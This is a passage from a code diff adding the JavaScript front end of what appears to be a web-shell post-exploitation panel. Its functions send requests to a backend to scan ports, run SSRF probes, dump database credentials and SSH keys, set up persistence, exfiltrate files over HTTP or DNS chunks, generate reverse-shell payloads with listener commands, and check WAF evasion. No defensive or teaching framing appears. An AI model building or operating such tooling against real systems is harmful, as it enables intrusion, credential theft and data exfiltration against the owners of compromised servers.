+                if (result.success) {
+                    const resultsDiv = document.getElementById('scanResults');
+                    resultsDiv.innerHTML = '';
+                    
+                    Object.entries(result.raw_results).forEach(([port, isOpen]) => {
+                        const div = document.createElement('div');
+                        div.className = 'port-item ' + (isOpen ? 'open' : 'closed');
+                        div.textContent = port;
+                        resultsDiv.appendChild(div);
+                    });
+                    
+                    updatePostExploitOutput('Scan complete!\nOpen ports: ' + result.open_ports.join(', '));
+                } else {
+                    updatePostExploitOutput('Error: ' + result.error);
+                }
+            } catch (error) {
+                updatePostExploitOutput('Error: ' + error.message);
+            }
+        }
+        
+        async function runSsrfProbe() {
+            const url = document.getElementById('ssrfUrl').value;
+            
+            if (!url) {
+                alert('Please enter target URL');
+                return;
+            }
+            
+            updatePostExploitOutput('Probing ' + url + '...');
+            
+            try {
+                const response = await fetch('/api/webshell/ssrf', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value,
+                        target_url: url
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    updatePostExploitOutput('SSRF Response (' + result.response_length + ' bytes):\n\n' + result.response);
+                } else {
+                    updatePostExploitOutput('Error: ' + result.error);
+                }
+            } catch (error) {
+                updatePostExploitOutput('Error: ' + error.message);
+            }
+        }
+        
+        async function dumpCredentials() {
+            updatePostExploitOutput('Dumping credentials...');
+            
+            try {
+                const response = await fetch('/api/webshell/creds', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    let output = 'Credential Dump Results:\n\n';
+                    output += 'Web Configs Found: ' + result.credentials.web_configs.join(', ') + '\n\n';
+                    output += 'Database Credentials:\n' + JSON.stringify(result.credentials.database_creds, null, 2) + '\n\n';
+                    output += 'SSH Keys Found: ' + result.credentials.ssh_keys_found.join(', ');
+                    updatePostExploitOutput(output);
+                } else {
+                    updatePostExploitOutput('Error: ' + result.error);
+                }
+            } catch (error) {
+                updatePostExploitOutput('Error: ' + error.message);
+            }
+        }
+        
+        async function establishPersistence() {
+            const method = document.getElementById('persistMethod').value;
+            
+            updatePostExploitOutput('Establishing persistence via ' + method + '...');
+            
+            try {
+                const response = await fetch('/api/webshell/persist', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value,
+                        method: method
+                    })
+                });
+                
+                const result = await response.json();
+                updatePostExploitOutput(result.message || 'Result: ' + JSON.stringify(result));
+            } catch (error) {
+                updatePostExploitOutput('Error: ' + error.message);
+            }
+        }
+        
+        async function exfiltrateData() {
+            const path = document.getElementById('exfilPath').value;
+            const method = document.getElementById('exfilMethod').value;
+            
+            if (!path) {
+                alert('Please enter file path');
+                return;
+            }
+            
+            updatePostExploitOutput('Exfiltrating ' + path + '...');
+            
+            try {
+                const response = await fetch('/api/webshell/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentSession,
+                        url: document.getElementById('terminalUrl').value,
+                        password: document.getElementById('terminalPassword').value,
+                        path: path,
+                        method: method
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    if (method === 'http') {
+                        // Decode base64
+                        try {
+                            const decoded = atob(result.data);
+                            updatePostExploitOutput('Exfiltrated Data:\n\n' + decoded);
+                        } catch {
+                            updatePostExploitOutput('Exfiltrated Data (Base64):\n\n' + result.data);
+                        }
+                    } else {
+                        updatePostExploitOutput('DNS Chunks:\n\n' + result.chunks.join('\n'));
+                    }
+                } else {
+                    updatePostExploitOutput('Error: ' + result.error);
+                }
+            } catch (error) {
+                updatePostExploitOutput('Error: ' + error.message);
+            }
+        }
+        
+        function updatePostExploitOutput(text) {
+            document.getElementById('postExploitOutput').textContent = text;
+        }
+        
+        // Reverse shell
+        async function generateReverseShell() {
+            const host = document.getElementById('reverseHost').value;
+            const port = parseInt(document.getElementById('reversePort').value);
+            const type = document.getElementById('reverseType').value;
+            
+            if (!host) {
+                alert('Please enter listener host');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/webshell/reverse', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ host, port, type })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('reverseOutput').style.display = 'block';
+                    document.getElementById('reverseCode').textContent = result.payload;
+                    document.getElementById('listenerCmd').textContent = result.listener_command;
+                } else {
+                    alert('Error: ' + result.error);
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+        
+        function copyReverseShell() {
+            const code = document.getElementById('reverseCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('Reverse shell copied!');
+            });
+        }
+        
+        // WAF bypass test
+        async function testWafBypass() {
+            if (!generatedShell) {
+                alert('Generate a shell first');
+                return;
+            }
+            
+            alert('WAF bypass analysis: Shell uses ' + generatedShell.techniques?.length + ' evasion techniques');
+        }
+        
+        // Load status on page load
+        async function loadStatus() {
+            try {
+                const response = await fetch('/api/webshell/status');
+                const status = await response.json();
+                
+                if (status.available) {
+                    console.log('Web Shell module loaded:', status);
+                } else {
+                    console.error('Web Shell module not available:', status.error);
+                }
+            } catch (error) {
+                console.error('Failed to load status:', error);
+            }
+        }
+        
+        loadStatus();
+    </script>
+</body>
+</html>
